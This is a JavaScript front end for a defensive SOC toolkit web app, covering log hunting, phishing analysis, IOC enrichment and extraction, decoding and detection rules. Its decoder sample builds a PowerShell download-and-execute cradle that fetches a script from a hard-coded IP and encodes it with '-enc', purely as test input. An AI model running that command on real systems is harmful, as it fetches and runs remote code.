/* SOC Toolkit front end. Vanilla JS, no dependencies.
 * Every string that comes from a report is inserted with textContent (never innerHTML):
 * the data under analysis is attacker-controlled. */
(function () {
  "use strict";

  const SEVERITIES = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"];
  const state = { meta: null, huntKind: "dns", huntFile: null, phishFile: null };

  // ---------- tiny DOM helper ----------
  function h(tag, attrs, ...children) {
    const el = document.createElement(tag);
    for (const [k, v] of Object.entries(attrs || {})) {
      if (v === null || v === undefined || v === false) continue;
      if (k === "class") el.className = v;
      else if (k === "text") el.textContent = v;
      else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
      else el.setAttribute(k, v === true ? "" : v);
    }
    for (const c of children.flat()) {
      if (c === null || c === undefined || c === false) continue;
      el.append(c instanceof Node ? c : document.createTextNode(String(c)));
    }
    return el;
  }
  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
  const sevClass = (s) => "sev-" + String(s).toLowerCase();

  // ---------- toast ----------
  let toastTimer;
  function toast(msg) {
    const t = $("#toast");
    t.textContent = msg;
    t.classList.add("show");
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => t.classList.remove("show"), 2200);
  }

  async function copy(text, what) {
    try {
      await navigator.clipboard.writeText(text);
      toast(`${what} copied`);
    } catch (e) {
      const ta = h("textarea", { class: "visually-hidden" });
      ta.value = text;
      document.body.append(ta);
      ta.select();
      document.execCommand("copy");
      ta.remove();
      toast(`${what} copied`);
    }
  }

  function download(name, text, type) {
    const url = URL.createObjectURL(new Blob([text], { type }));
    const a = h("a", { href: url, download: name });
    document.body.append(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  }

  // ---------- API ----------
  async function api(path, body) {
    const res = await fetch(path, {
      method: body ? "POST" : "GET",
      headers: body ? { "Content-Type": "application/json" } : {},
      body: body ? JSON.stringify(body) : undefined,
    });
    let data;
    try { data = await res.json(); } catch (e) { data = { error: `Server returned HTTP ${res.status}` }; }
    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
    return data;
  }

  async function busy(button, fn) {
    const label = button.innerHTML;
    button.disabled = true;
    button.setAttribute("aria-busy", "true");
    button.replaceChildren(h("span", { class: "spinner", "aria-hidden": "true" }), "Working…");
    try { return await fn(); }
    finally {
      button.disabled = false;
      button.removeAttribute("aria-busy");
      button.innerHTML = label; // restores our own static markup only
    }
  }

  function showError(container, err) {
    container.replaceChildren(h("div", { class: "alert", role: "alert" },
      h("strong", { text: "Couldn't run the analysis." }), " ", err.message || String(err)));
  }

  // ---------- routing ----------
  const VIEWS = ["hunt", "phish", "enrich", "extract", "decode", "rules"];
  function route() {
    const view = VIEWS.includes(location.hash.slice(1)) ? location.hash.slice(1) : "hunt";
    for (const v of VIEWS) $("#view-" + v).hidden = v !== view;
    for (const a of $$(".sidebar a")) {
      if (a.dataset.view === view) a.setAttribute("aria-current", "page");
      else a.removeAttribute("aria-current");
    }
    const titles = { hunt: "Log hunt", phish: "Phishing email", enrich: "IOC enrichment",
      extract: "IOC extractor", decode: "Decoder", rules: "Detection rules" };
    document.title = `${titles[view]} · SOC Toolkit`;
  }
  window.addEventListener("hashchange", () => { route(); $("#main").focus({ preventScroll: true }); window.scrollTo(0, 0); });

  // ---------- theme ----------
  function currentTheme() {
    const set = document.documentElement.dataset.theme;
    if (set) return set;
    return matchMedia("(prefers-color-scheme: light)").matches ? "light" : "dark";
  }
  function syncThemeButton() {
    const next = currentTheme() === "dark" ? "light" : "dark";
    $("#theme-toggle").setAttribute("aria-label", `Switch to ${next} theme`);
    $("#theme-toggle").title = `Switch to ${next} theme`;
  }
  $("#theme-toggle").addEventListener("click", () => {
    const next = currentTheme() === "dark" ? "light" : "dark";
    document.documentElement.dataset.theme = next;
    try { localStorage.setItem("soctool-theme", next); } catch (e) { /* ignore */ }
    syncThemeButton();
  });

  // ---------- file inputs / drop zones ----------
  function fmtBytes(n) {
    if (n < 1024) return `${n} B`;
    if (n < 1048576) return `${(n / 1024).toFixed(1)} KB`;
    return `${(n / 1048576).toFixed(1)} MB`;
  }

  function wireDropzone(zone, onFile) {
    const input = $("input[type=file]", zone);
    input.addEventListener("change", () => input.files[0] && onFile(input.files[0]));
    ["dragenter", "dragover"].forEach((ev) => zone.addEventListener(ev, (e) => {
      e.preventDefault(); zone.classList.add("dragover");
    }));
    ["dragleave", "drop"].forEach((ev) => zone.addEventListener(ev, (e) => {
      e.preventDefault(); zone.classList.remove("dragover");
    }));
    zone.addEventListener("drop", (e) => { const f = e.dataTransfer.files[0]; if (f) onFile(f); });
  }

  function setFileStatus(zone, file, extra) {
    zone.classList.toggle("has-file", !!file);
    const status = $(".file-status", zone);
    status.replaceChildren();
    if (!file) return;
    status.append(`${file.name} · ${fmtBytes(file.size)}${extra ? " · " + extra : ""} `);
    status.append(h("button", { type: "button", class: "btn small ghost", text: "Clear",
      onclick: () => { zone.dispatchEvent(new CustomEvent("clear")); } }));
  }

  function fileToBase64(file) {
    return new Promise((resolve, reject) => {
      const r = new FileReader();
      r.onload = () => resolve(String(r.result).split(",", 2)[1] || "");
      r.onerror = () => reject(new Error("could not read the file"));
      r.readAsDataURL(file);
    });
  }

  // ---------- generic report rendering ----------
  function renderReport(container, data, opts = {}) {
    const report = data.report;
    const findings = report.findings;
    const frag = [];
    const slug = (opts.filename || "soc-report").replace(/[^\w.-]+/g, "_");

    frag.push(h("div", { class: "result-head" },
      h("div", {}, h("h2", { text: report.title }),
        h("div", { class: "meta", text: `${findings.length} finding${findings.length === 1 ? "" : "s"} · generated ${new Date().toLocaleString()}` })),
      h("div", { class: "export", role: "group", "aria-label": "Export report" },
        h("button", { type: "button", class: "btn small", onclick: () => copy(data.markdown, "Ticket notes") }, "Copy as ticket notes"),
        h("button", { type: "button", class: "btn small ghost", onclick: () => download(slug + ".md", data.markdown, "text/markdown") }, "Markdown"),
        h("button", { type: "button", class: "btn small ghost", onclick: () => download(slug + ".json", JSON.stringify(report, null, 2), "application/json") }, "JSON"),
        h("button", { type: "button", class: "btn small ghost", onclick: () => download(slug + ".csv", data.csv, "text/csv") }, "CSV"))));

    if (opts.before) frag.push(...opts.before(report));

    // Findings first: under time pressure the analyst needs "what fired", then the context.
    frag.push(findingsBlock(findings));

    const sections = report.sections.filter((s) => !(opts.skipSections || []).includes(s.heading));
    if (sections.length) {
      const worst = {};
      for (const f of findings) {
        if (!worst[f.entity] || SEVERITIES.indexOf(f.severity) < SEVERITIES.indexOf(worst[f.entity])) worst[f.entity] = f.severity;
      }
      if (opts.contextTitle) frag.push(h("h2", { class: "section-title", text: opts.contextTitle }));
      frag.push(h("div", { class: "facts" }, sections.map((s) => factCard(s, opts.literalHeadings, worst[s.heading]))));
    }
    container.replaceChildren(...frag);
    toast(`Done — ${findings.length} finding${findings.length === 1 ? "" : "s"}`);
    container.scrollIntoView({ behavior: matchMedia("(prefers-reduced-motion: reduce)").matches ? "auto" : "smooth", block: "start" });
  }

  function valueNode(v) {
    if (Array.isArray(v)) {
      if (!v.length) return "—";
      return h("span", { class: "chip-list" }, v.map((x) => h("span", { text: String(x) })));
    }
    if (v === null || v === undefined || v === "") return "—";
    return String(v);
  }

  function factCard(section, literal, severity) {
    const entries = Object.entries(section.data);
    // Indicator headings are case-sensitive data (URL paths, hashes): never restyle their case.
    const head = literal
      ? h("h3", { class: "literal" }, severity ? h("span", { class: `badge ${sevClass(severity)}`, text: severity }) : null, h("span", { text: section.heading }))
      : h("h3", { text: section.heading });
    return h("section", { class: entries.length > 6 ? "card wide" : "card", "aria-label": section.heading },
      head,
      h("dl", { class: "kv" }, entries.flatMap(([k, v]) => [h("dt", { text: k }), h("dd", {}, valueNode(v))])));
  }

  function findingsBlock(findings) {
    const wrap = h("div", { class: "findings-wrap" });
    if (!findings.length) {
      wrap.append(h("div", { class: "empty" },
        svgCheck(), h("strong", { text: "No findings" }),
        h("span", { text: "Nothing crossed a detection threshold. Lower the thresholds under “Tuning” if you expected hits." })));
      return wrap;
    }
    const counts = Object.fromEntries(SEVERITIES.map((s) => [s, 0]));
    findings.forEach((f) => counts[f.severity]++);
    const active = new Set(SEVERITIES);
    const list = h("div", { class: "findings", role: "list" });
    const search = h("input", { type: "search", class: "search", placeholder: "Filter findings", "aria-label": "Filter findings" });
    const counter = h("span", { class: "visually-hidden", "aria-live": "polite" });

    const cards = findings.map((f, i) => findingCard(f, i < 3 && ["CRITICAL", "HIGH"].includes(f.severity)));
    list.append(...cards);

    function apply() {
      const q = search.value.trim().toLowerCase();
      let shown = 0;
      findings.forEach((f, i) => {
        const hay = `${f.rule_id} ${f.title} ${f.entity} ${f.description} ${f.mitre.map((m) => m.id + " " + m.name).join(" ")}`.toLowerCase();
        const ok = active.has(f.severity) && (!q || hay.includes(q));
        cards[i].hidden = !ok;
        if (ok) shown++;
      });
      counter.textContent = `${shown} of ${findings.length} findings shown`;
    }
    search.addEventListener("input", apply);

    const chips = SEVERITIES.filter((s) => counts[s]).map((s) =>
      h("button", { type: "button", class: `sev-chip ${sevClass(s)}`, "aria-pressed": "true",
        onclick: (e) => {
          const b = e.currentTarget;
          const on = b.getAttribute("aria-pressed") === "true";
          b.setAttribute("aria-pressed", String(!on));
          on ? active.delete(s) : active.add(s);
          apply();
        } },
        h("span", { class: "swatch", "aria-hidden": "true" }), s.charAt(0) + s.slice(1).toLowerCase(),
        h("span", { class: "n", text: counts[s] })));

    wrap.append(h("div", { class: "sev-filter", role: "group", "aria-label": "Filter by severity" }, chips, search, counter), list);
    wrap.style.display = "grid";
    wrap.style.gap = "12px";
    return wrap;
  }

  function svgCheck() {
    const ns = "http://www.w3.org/2000/svg";
    const s = document.createElementNS(ns, "svg");
    s.setAttribute("viewBox", "0 0 24 24"); s.setAttribute("aria-hidden", "true");
    const c = document.createElementNS(ns, "circle"); c.setAttribute("cx", "12"); c.setAttribute("cy", "12"); c.setAttribute("r", "9");
    const p = document.createElementNS(ns, "path"); p.setAttribute("d", "m8 12 3 3 5-6");
    s.append(c, p);
    return s;
  }

  let findingSeq = 0;
  function findingCard(f, open) {
    const id = "f" + (++findingSeq);
    const card = h("div", { class: `finding ${sevClass(f.severity)}`, "data-open": String(open), role: "listitem" });
    const btn = h("button", { type: "button", "aria-expanded": String(open), "aria-controls": id },
      h("span", { class: "badge", text: f.severity }),
      h("span", { class: "rule-id", text: f.rule_id }),
      h("span", { class: "f-main" }, h("span", { class: "f-title", text: f.title }), h("span", { class: "f-entity", text: f.entity, title: f.entity })),
      h("span", { class: "chev", "aria-hidden": "true" }));
    btn.addEventListener("click", () => {
      const now = card.dataset.open !== "true";
      card.dataset.open = String(now);
      btn.setAttribute("aria-expanded", String(now));
    });

    const meta = h("div", { class: "f-meta" });
    if (f.first_seen || f.last_seen) meta.append(h("span", {}, h("b", { text: "Window " }), `${f.first_seen || "?"} → ${f.last_seen || "?"}`));

    const body = h("div", { class: "f-body", id },
      h("p", { text: f.description }), meta.childNodes.length ? meta : null,
      f.mitre.length ? h("div", { class: "mitre", "aria-label": "MITRE ATT&CK techniques" }, f.mitre.map((m) =>
        h("a", { href: `https://attack.mitre.org/techniques/${m.id.replace(".", "/")}/`, target: "_blank", rel: "noopener noreferrer" },
          h("b", { text: m.id }), m.name))) : null,
      f.evidence.length ? h("div", { class: "evidence" },
        h("pre", { tabindex: "0", "aria-label": "Evidence", text: f.evidence.join("\n") }),
        h("button", { type: "button", class: "btn small copy", onclick: () => copy(f.evidence.join("\n"), "Evidence") }, "Copy")) : null);
    card.append(btn, body);
    return card;
  }

  // ---------- Log hunt ----------
  function buildHunt() {
    const fs = $("#hunt-kind");
    const wrap = h("div", { class: "seg-wrap" });
    for (const [kind, info] of Object.entries(state.meta.hunters)) {
      const input = h("input", { type: "radio", name: "kind", value: kind, checked: kind === state.huntKind });
      input.addEventListener("change", () => { state.huntKind = kind; syncHunt(); });
      wrap.append(h("label", {}, input, info.label));
    }
    fs.append(wrap);
    syncHunt();
  }

  function syncHunt() {
    const info = state.meta.hunters[state.huntKind];
    $("#hunt-hint").textContent = info.hint;
    $("#hunt-file").setAttribute("accept", info.accepts);
    $("#resolver-field").hidden = state.huntKind !== "dns";
    const grid = $("#hunt-thresholds");
    grid.replaceChildren(...Object.entries(info.defaults).map(([k, v]) =>
      h("label", {}, h("span", { text: k }), h("input", { type: "number", step: "any", name: k, placeholder: String(v), "aria-label": `${k} (default ${v})` }))));
  }

  function wireHunt() {
    const zone = $('.dropzone[data-for="hunt"]');
    wireDropzone(zone, (file) => { state.huntFile = file; setFileStatus(zone, file); });
    zone.addEventListener("clear", () => { state.huntFile = null; $("#hunt-file").value = ""; setFileStatus(zone, null); });

    $("#hunt-sample").addEventListener("click", async (e) => {
      try {
        const s = await busy(e.currentTarget, () => api("/api/sample", { name: state.huntKind }));
        state.huntFile = new File([s.content], s.name);
        setFileStatus(zone, state.huntFile, "sample with planted attacks");
        $("#form-hunt").requestSubmit();
      } catch (err) { showError($("#results-hunt"), err); }
    });

    $("#form-hunt").addEventListener("submit", async (e) => {
      e.preventDefault();
      const out = $("#results-hunt");
      const pasted = $("#hunt-paste").value;
      if (!state.huntFile && !pasted.trim()) {
        showError(out, new Error("Choose a log file, paste some lines or load the sample first."));
        return;
      }
      const settings = {};
      $$("#hunt-thresholds input").forEach((i) => { if (i.value !== "") settings[i.name] = i.value; });
      try {
        const data = await busy($("#hunt-run"), async () => api("/api/hunt", {
          kind: state.huntKind,
          filename: state.huntFile ? state.huntFile.name : "pasted lines",
          content: state.huntFile ? await state.huntFile.text() : pasted,
          settings,
          allowlist: $("#hunt-allow").value,
          resolvers: $("#hunt-resolvers").value,
        }));
        renderReport(out, data, { filename: `${state.huntKind}-hunt`, contextTitle: "Run details" });
      } catch (err) { showError(out, err); }
    });
  }

  // ---------- Phishing ----------
  function wirePhish() {
    const zone = $('.dropzone[data-for="phish"]');
    wireDropzone(zone, (file) => { state.phishFile = file; setFileStatus(zone, file); });
    zone.addEventListener("clear", () => { state.phishFile = null; $("#phish-file").value = ""; setFileStatus(zone, null); });

    $$("#form-phish [data-sample]").forEach((b) => b.addEventListener("click", async (e) => {
      const btn = e.currentTarget;
      try {
        const s = await busy(btn, () => api("/api/sample", { name: btn.dataset.sample }));
        state.phishFile = new File([s.content], s.name);
        setFileStatus(zone, state.phishFile, "sample");
        $("#form-phish").requestSubmit();
      } catch (err) { showError($("#results-phish"), err); }
    }));

    $("#form-phish").addEventListener("submit", async (e) => {
      e.preventDefault();
      const out = $("#results-phish");
      const pasted = $("#phish-paste").value;
      if (!state.phishFile && !pasted.trim()) {
        showError(out, new Error("Choose an .eml file or paste the raw message source first."));
        return;
      }
      try {
        const data = await busy($("#phish-run"), async () => api("/api/phish", state.phishFile
          ? { filename: state.phishFile.name, content_b64: await fileToBase64(state.phishFile) }
          : { filename: "pasted message", content: pasted }));
        renderReport(out, data, {
          filename: "phishing-analysis",
          contextTitle: "Message details",
          skipSections: ["Verdict"],
          before: (report) => [verdictBanner(report)],
        });
      } catch (err) { showError(out, err); }
    });
  }

  function verdictBanner(report) {
    const v = report.sections.find((s) => s.heading === "Verdict");
    if (!v) return h("div");
    const score = parseInt(String(v.data.Score), 10) || 0;
    const tone = score >= 50 ? "bad" : score >= 20 ? "warn" : "good";
    const bar = h("div", { class: "bar", role: "meter", "aria-valuemin": "0", "aria-valuemax": "100", "aria-valuenow": String(score), "aria-label": "Phishing risk score" }, h("span"));
    bar.firstChild.style.width = `${Math.max(score, 3)}%`;
    return h("div", { class: `verdict ${tone}` },
      h("div", { class: "score" }, String(score), h("small", { text: " / 100" })),
      h("div", { class: "label", text: v.data.Verdict }),
      bar);
  }

  // ---------- Enrichment ----------
  function wireEnrich() {
    const keys = state.meta.online_keys;
    const have = [keys.virustotal && "VirusTotal", keys.abuseipdb && "AbuseIPDB"].filter(Boolean);
    const box = $("#enrich-online");
    if (!have.length) {
      box.disabled = true;
      $("#online-note").textContent = "— set VT_API_KEY / ABUSEIPDB_API_KEY before running soc web to enable";
    } else {
      $("#online-note").textContent = `— keys found: ${have.join(", ")}. Public indicators only are sent.`;
    }
    $('#form-enrich [data-sample="iocs"]').addEventListener("click", async (e) => {
      try {
        const s = await busy(e.currentTarget, () => api("/api/sample", { name: "iocs" }));
        $("#enrich-values").value = s.content;
        $("#form-enrich").requestSubmit();
      } catch (err) { showError($("#results-enrich"), err); }
    });
    $("#form-enrich").addEventListener("submit", async (e) => {
      e.preventDefault();
      const out = $("#results-enrich");
      try {
        const data = await busy($('#form-enrich button[type=submit]'), () =>
          api("/api/ioc/enrich", { values: $("#enrich-values").value, online: box.checked }));
        renderReport(out, data, { filename: "ioc-enrichment", literalHeadings: true, contextTitle: "Indicator details" });
      } catch (err) { showError(out, err); }
    });
  }

  // ---------- Extractor ----------
  const IOC_LABELS = { ipv4: "IPv4", ipv6: "IPv6", domains: "Domains", urls: "URLs", emails: "Email addresses",
    md5: "MD5", sha1: "SHA-1", sha256: "SHA-256", cves: "CVEs" };

  function wireExtract() {
    $("#form-extract").addEventListener("submit", async (e) => {
      e.preventDefault();
      const out = $("#results-extract");
      try {
        const data = await busy($('#form-extract button[type=submit]'), () =>
          api("/api/ioc/extract", { text: $("#extract-text").value, include_private: $("#extract-private").checked }));
        renderExtract(out, data);
      } catch (err) { showError(out, err); }
    });
  }

  function renderExtract(out, data) {
    if (!data.total) {
      out.replaceChildren(h("div", { class: "empty" }, h("strong", { text: "No indicators found" }),
        h("span", { text: "Private IPs are hidden by default — tick “Keep private / internal IPs” to include them." })));
      return;
    }
    let defanged = true;
    const groups = h("div", { class: "ioc-groups" });
    const toggle = h("button", { type: "button", class: "btn small", "aria-pressed": "true" }, "Defanged");
    const all = () => Object.values(data.iocs).flat().map((i) => (defanged ? i.defanged : i.value)).join("\n");

    function draw() {
      groups.replaceChildren(...Object.entries(data.iocs).filter(([, v]) => v.length).map(([k, vals]) => {
        const text = vals.map((i) => (defanged ? i.defanged : i.value)).join("\n");
        return h("section", { class: "card ioc-group", "aria-label": IOC_LABELS[k] },
          h("h3", {}, h("span", {}, IOC_LABELS[k], " ", h("span", { class: "count", text: `(${vals.length})` })),
            h("button", { type: "button", class: "btn small ghost", onclick: () => copy(text, IOC_LABELS[k]) }, "Copy")),
          h("div", { class: "evidence" }, h("pre", { tabindex: "0", text })));
      }));
    }
    toggle.addEventListener("click", () => {
      defanged = !defanged;
      toggle.setAttribute("aria-pressed", String(defanged));
      toggle.textContent = defanged ? "Defanged" : "Raw (live)";
      draw();
    });
    draw();
    out.replaceChildren(
      h("div", { class: "toolbar" },
        h("div", { class: "result-head" }, h("h2", { text: `${data.total} indicator${data.total === 1 ? "" : "s"} found` })),
        h("div", { class: "export" }, toggle,
          h("button", { type: "button", class: "btn small", onclick: () => copy(all(), "All indicators") }, "Copy all"),
          h("button", { type: "button", class: "btn small ghost", onclick: () => {
            document.location.hash = "#enrich";
            $("#enrich-values").value = Object.values(data.iocs).flat().map((i) => i.value).join("\n");
          } }, "Send to enrichment →"))),
      groups);
  }

  // ---------- Decoder ----------
  function wireDecode() {
    $("#decode-sample").addEventListener("click", () => {
      // IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/a.ps1') - as PowerShell -enc
      const cmd = "IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/a.ps1')";
      let bin = "";
      for (const ch of cmd) bin += ch + "\0";
      $("#decode-text").value = "powershell.exe -nop -w hidden -enc " + btoa(bin);
      $("#form-decode").requestSubmit();
    });
    $("#form-decode").addEventListener("submit", async (e) => {
      e.preventDefault();
      const out = $("#results-decode");
      try {
        const data = await busy($('#form-decode button[type=submit]'), () => api("/api/decode", { text: $("#decode-text").value }));
        const layers = data.report.sections.filter((s) => s.heading.startsWith("Layer "));
        renderReport(out, data, {
          filename: "decode",
          skipSections: data.report.sections.filter((s) => s.heading.startsWith("Layer ")).map((s) => s.heading),
          before: () => layers.length ? [h("div", { class: "card layers" }, layers.map((l) =>
            h("div", { class: "layer" }, h("h3", { text: l.heading.replace(/^Layer \d+: /, "") }),
              h("div", { class: "evidence" }, h("pre", { tabindex: "0", text: String(l.data.Output) }),
                h("button", { type: "button", class: "btn small copy", onclick: () => copy(String(l.data.Output), "Decoded text") }, "Copy")))))]
            : [h("div", { class: "empty" }, h("strong", { text: "Nothing to decode" }),
                h("span", { text: "No Base64, PowerShell -enc, URL or hex encoding was recognised." }))],
        });
      } catch (err) { showError(out, err); }
    });
  }

  // ---------- Rules ----------
  function buildRules() {
    const list = $("#rules-list");
    const rows = state.meta.rules.map((r) => {
      const el = h("article", { class: "rule" },
        h("span", { class: "rule-id", text: r.id }),
        h("div", {}, h("h2", { text: r.title }), h("p", { text: r.description }),
          h("div", { class: "mitre" }, r.mitre.map((m) =>
            h("a", { href: `https://attack.mitre.org/techniques/${m.id.replace(".", "/")}/`, target: "_blank", rel: "noopener noreferrer" },
              h("b", { text: m.id }), m.name)))));
      el.dataset.hay = `${r.id} ${r.title} ${r.description} ${r.mitre.map((m) => m.id + " " + m.name).join(" ")}`.toLowerCase();
      return el;
    });
    list.replaceChildren(...rows);
    $("#rules-filter").addEventListener("input", (e) => {
      const q = e.target.value.trim().toLowerCase();
      rows.forEach((r) => { r.hidden = q && !r.dataset.hay.includes(q); });
    });
  }

  // ---------- keyboard ----------
  document.addEventListener("keydown", (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
      const view = $(".view:not([hidden])");
      const form = view && $("form", view);
      if (form) { e.preventDefault(); form.requestSubmit(); }
    }
  });

  // ---------- boot ----------
  async function boot() {
    syncThemeButton();
    route();
    try {
      state.meta = await api("/api/meta");
    } catch (err) {
      $("#main").prepend(h("div", { class: "alert", role: "alert" }, h("strong", { text: "Can't reach the soctool server." }),
        " Make sure `soc web` is still running, then reload."));
      return;
    }
    $("#version").textContent = "v" + state.meta.version;
    buildHunt();
    wireHunt();
    wirePhish();
    wireEnrich();
    wireExtract();
    wireDecode();
    buildRules();
  }
  boot();
})();
